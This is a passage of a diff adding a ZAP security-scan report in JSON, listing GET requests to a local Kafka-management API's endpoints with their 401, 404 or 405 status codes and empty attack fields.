+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8635",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/status/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/status\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "812",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/topics",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/topics",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "33",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/topics?search=ZAP",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/topics (search)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8638",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/topics/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/topics\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "144",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/topics/1607721000486206230",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/topics\/1607721000486206230",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "35",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/topics/topic_name",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/topics\/topic_name",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8645",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/topics/topic_name/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/topics\/topic_name\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8",
+							"uri": "http://host.docker.internal:8000/api/hosts",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8647",
+							"uri": "http://host.docker.internal:8000/api/hosts/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "145",
+							"uri": "http://host.docker.internal:8000/api/hosts/1422243273128435569",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/1422243273128435569",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "10",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8648",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "146",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id/895655345997634870",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id\/895655345997634870",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "819",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8646",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "147",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/3911956852302283914",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/3911956852302283914",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "823",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8650",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "148",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/8504487077700186840",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/8504487077700186840",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "828",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "8654",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "149",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/7906436836702573253",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/7906436836702573253",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "90",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/config",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/config",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8658",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/config/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/config\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "87",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/status",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/status",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8660",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/status/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/status\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "836",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/tasks",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/tasks",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8657",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/tasks/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/tasks\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "150",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/tasks/2104863108265848190",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/tasks\/2104863108265848190",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "89",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/tasks/task_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/tasks\/task_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8661",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/tasks/task_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/tasks\/task_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "844",
+							"uri": "http://host.docker.internal:8000/api/monitoring",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8663",
+							"uri": "http://host.docker.internal:8000/api/monitoring/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "151",
+							"uri": "http://host.docker.internal:8000/api/monitoring/2070182377356940441",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/2070182377356940441",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "852",
+							"uri": "http://host.docker.internal:8000/api/monitoring/clusters",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/clusters",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8665",
+							"uri": "http://host.docker.internal:8000/api/monitoring/clusters/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/clusters\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "152",
+							"uri": "http://host.docker.internal:8000/api/monitoring/clusters/2039017926184874302",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/clusters\/2039017926184874302",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "858",
+							"uri": "http://host.docker.internal:8000/api/monitoring/clusters/cluster_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/clusters\/cluster_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8667",
+							"uri": "http://host.docker.internal:8000/api/monitoring/clusters/cluster_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/clusters\/cluster_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "153",
+							"uri": "http://host.docker.internal:8000/api/monitoring/clusters/cluster_id/5139917614165248149",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/clusters\/cluster_id\/5139917614165248149",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "76",
+							"uri": "http://host.docker.internal:8000/api/monitoring/clusters/cluster_id/exporters-status",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/clusters\/cluster_id\/exporters-status",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8670",
+							"uri": "http://host.docker.internal:8000/api/monitoring/clusters/cluster_id/exporters-status/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/clusters\/cluster_id\/exporters-status\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "77",
+							"uri": "http://host.docker.internal:8000/api/monitoring/dashboards",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/dashboards",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8671",
+							"uri": "http://host.docker.internal:8000/api/monitoring/dashboards/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/dashboards\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "154",
+							"uri": "http://host.docker.internal:8000/api/monitoring/dashboards/7250400455262328646",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/dashboards\/7250400455262328646",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "867",
+							"uri": "http://host.docker.internal:8000/api/monitoring/dashboards/ZAP",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/dashboards\/ZAP",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8672",
+							"uri": "http://host.docker.internal:8000/api/monitoring/dashboards/ZAP/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/dashboards\/ZAP\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "155",
+							"uri": "http://host.docker.internal:8000/api/monitoring/dashboards/ZAP/6240463798649202408",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/dashboards\/ZAP\/6240463798649202408",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "78",
+							"uri": "http://host.docker.internal:8000/api/monitoring/dashboards/ZAP/url",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/dashboards\/ZAP\/url",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8675",
+							"uri": "http://host.docker.internal:8000/api/monitoring/dashboards/ZAP/url/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/dashboards\/ZAP\/url\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "871",
+							"uri": "http://host.docker.internal:8000/api/monitoring/install",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/install",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "8678",
+							"uri": "http://host.docker.internal:8000/api/monitoring/install/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/install\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "156",
+							"uri": "http://host.docker.internal:8000/api/monitoring/install/7641987813154338911",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/install\/7641987813154338911",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "74",
+							"uri": "http://host.docker.internal:8000/api/monitoring/install/task_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/install\/task_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8684",
+							"uri": "http://host.docker.internal:8000/api/monitoring/install/task_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/install\/task_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "72",
+							"uri": "http://host.docker.internal:8000/api/monitoring/status",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/status",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8680",
+							"uri": "http://host.docker.internal:8000/api/monitoring/status/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/status\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "882",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8682",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "157",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/1648692915785679955",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/1648692915785679955",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "884",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/clusters",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/clusters",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8686",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/clusters/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/clusters\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "158",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/clusters/6939281302760491904",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/clusters\/6939281302760491904",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "889",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/clusters/cluster_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/clusters\/cluster_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "8689",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/clusters/cluster_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/clusters\/cluster_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "159",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/clusters/cluster_id/1707682815179330361",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/clusters\/cluster_id\/1707682815179330361",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "86",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/clusters/cluster_id/pre-check",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/clusters\/cluster_id\/pre-check",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8695",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/clusters/cluster_id/pre-check/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/clusters\/cluster_id\/pre-check\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "894",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/tasks",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/tasks",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8690",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/tasks/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/tasks\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "160",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/tasks/2615269681946322328",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/tasks\/2615269681946322328",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "85",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/tasks/task_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/tasks\/task_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8693",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/tasks/task_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/tasks\/task_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "898",
+							"uri": "http://host.docker.internal:8000/api/security-scan",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/security-scan",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8697",
+							"uri": "http://host.docker.internal:8000/api/security-scan/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/security-scan\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "161",
+							"uri": "http://host.docker.internal:8000/api/security-scan/1250171399690882387",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/security-scan\/1250171399690882387",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "902",
+							"uri": "http://host.docker.internal:8000/api/security-scan/clusters",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/security-scan\/clusters",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8698",
+							"uri": "http://host.docker.internal:8000/api/security-scan/clusters/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/security-scan\/clusters\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "162",
+							"uri": "http://host.docker.internal:8000/api/security-scan/clusters/8146459162906212597",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/security-scan\/clusters\/8146459162906212597",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "906",
+							"uri": "http://host.docker.internal:8000/api/security-scan/clusters/cluster_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/security-scan\/clusters\/cluster_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8701",
+							"uri": "http://host.docker.internal:8000/api/security-scan/clusters/cluster_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/security-scan\/clusters\/cluster_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "163",
+							"uri": "http://host.docker.internal:8000/api/security-scan/clusters/cluster_id/2088389115089181619",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/security-scan\/clusters\/cluster_id\/2088389115089181619",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "910",
+							"uri": "http://host.docker.internal:8000/api/upgrades",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8702",
+							"uri": "http://host.docker.internal:8000/api/upgrades/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "164",
+							"uri": "http://host.docker.internal:8000/api/upgrades/6026163413224446529",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/6026163413224446529",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "912",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8705",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "165",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters/8862606296032275370",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters\/8862606296032275370",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "916",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters/cluster_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters\/cluster_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8707",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters/cluster_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters\/cluster_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "166",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters/cluster_id/6430405048010520015",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters\/cluster_id\/6430405048010520015",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "95",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters/cluster_id/available",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters\/cluster_id\/available",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8713",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters/cluster_id/available/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters\/cluster_id\/available\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "920",
+							"uri": "http://host.docker.internal:8000/api/upgrades/tasks",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/tasks",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8708",
+							"uri": "http://host.docker.internal:8000/api/upgrades/tasks/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/tasks\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "167",
+							"uri": "http://host.docker.internal:8000/api/upgrades/tasks/5464647287451341671",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/tasks\/5464647287451341671",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "98",
+							"uri": "http://host.docker.internal:8000/api/upgrades/tasks/task_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/tasks\/task_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8710",
+							"uri": "http://host.docker.internal:8000/api/upgrades/tasks/task_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/tasks\/task_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "923",
+							"uri": "http://host.docker.internal:8000/api/versions",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions",
+							"method": "GET",
